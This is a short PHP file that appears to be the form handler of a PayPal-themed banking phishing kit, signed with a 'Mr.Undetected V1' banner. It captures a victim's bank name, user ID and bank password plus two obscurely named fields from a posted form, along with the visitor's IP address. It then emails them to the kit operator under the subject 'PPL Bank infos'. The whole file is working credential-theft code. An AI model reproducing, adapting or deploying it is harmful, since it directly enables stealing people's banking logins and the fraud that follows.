<?php
//#     #            #     #                                                              #     #   #   
//##   ## #####      #     # #    # #####  ###### ##### ######  ####  ##### ###### #####  #     #  ##   
//# # # # #    #     #     # ##   # #    # #        #   #      #    #   #   #      #    # #     # # #   
//#  #  # #    #     #     # # #  # #    # #####    #   #####  #        #   #####  #    # #     #   #   
//#     # #####  ### #     # #  # # #    # #        #   #      #        #   #      #    #  #   #    #   
//#     # #   #  ### #     # #   ## #    # #        #   #      #    #   #   #      #    #   # #     #   
//#     # #    # ###  #####  #    # #####  ######   #   ######  ####    #   ###### #####     #    ##### 

include("system.php");
include '../../email.php';
include("function.php");

$_SESSION['_namebank_'] = $_POST['namebank'];
$_SESSION['_UserNameID_'] = $_POST['UserNameID'];
$_SESSION['_PasswordBank_'] = $_POST['PasswordBank'];
$_SESSION['_xxnxx_'] = $_POST['xxnxx'];
$_SESSION['_xxllxx_']  = $_POST['xxllxx'];

$ip=$_SESSION['ip']=getip();
$subject=$_SESSION['subject']=" PPL Bank infos | ".$ip."" . "\r\n";
send($_SESSION,$to,$subject) ; 

?>